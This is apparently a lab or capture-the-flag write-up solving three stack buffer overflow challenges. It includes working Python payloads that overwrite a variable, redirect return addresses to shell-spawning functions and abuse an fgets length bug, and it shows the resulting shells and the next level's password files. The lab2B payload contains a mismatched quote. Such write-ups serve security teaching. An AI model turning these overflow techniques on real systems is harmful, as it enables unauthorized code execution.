## lab2C

In this challenge, we have to input a string as an argument which will then be copied to an array. Afterwards there's a conditional statement where it checks if the variable ```set_me``` is equal to ```0xdeadbeef```. If yes, we spawn a shell and complete the challenge.

With the help of the ```strcpy``` function, we can write past the bounds of the buffer ```buf``` into the variable ```set_me```, which is conveniently placed next to our buffer. We have to keep in mind that in memory the values are little endian, therefore ```0xdeadbeef``` will be written in our payload as ```\xef\xbe\xad\xde```. 

```bash
./lab2c `python -c 'print "A" * 15 + "\xef\xbe\xad\xde"'`
$ cat ~lab2B/.pass
1m_all_ab0ut_d4t_b33f
```
## lab2B

Like the previous challenge, there is a function that executes system commands, but this time we have to specify the command as an argument. Fortunately, there is a global string ```/bin/sh```. 

We can overflow```buf```, change the RET to call the function with the address of ```exec_string``` as a parameter. However, we have to make sure that the stacks follow the call procedures -> the parameters are pushed from right to left and the address of the next instruction is put on the stack. With these in mind, we can construct our payload:

```bash
shell 0x80486bd
exec_string 0x80487d0

./lab2B `python -c 'print "A" * 23 + "BBBB" + "\xbd\x86\x04\x08' + "CCCC" + "\xd0\x87\x04\x08"'`
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaΩAAAA–á
$ cat ~lab2A/.pass
i_c4ll_wh4t_i_w4nt_n00b
```

## lab2A

There is a function ```shell``` that spawns a shell for us, therefore we have to redirect the flow of execution to call it. 
```main``` calls the function ```concatenate_first_char()```. The goal of that function is to read 10 words in the ```word_buf[12]``` array and adds the first letter of the words to a ```cat_buf[10]```. 

To do that, a ```for``` loop is used to call ```fgets```. We can see that the conditional statement is ```locals.i!=10```. Since the counter is next to ```word_buf[12]``` in memory, and that the length argument of the ```fgets``` function is set incorrectly (16 instead of 12), we can change the value of ```i``` to to create an infinite loop and call ```fgets``` as much as we like to overflow the ```cat_buf[10]``` array into RET. Of course, at one point we have to stop looping. In that case we will simply enter a newline. We also have to use ```cat -``` to keep writing to stdin.

```bash
(python -c 'print "AAAAAAAAAAAAA\n" * 20 + "BBBBBBBBBBBBB\n" * 4 + "\xfdCCCCCCCCCCCC\n" + "\x86CCCCCCCCCCCC\n" + "\x04CCCCCCCCCCCC\n" + "\x08CCCCCCCCCCCC\n" + "\n"' ; cat -) | ./lab2A
Input 10 words:
Failed to read word
You got it
cat ~lab2end/.pass
D1d_y0u_enj0y_y0ur_cats?
```
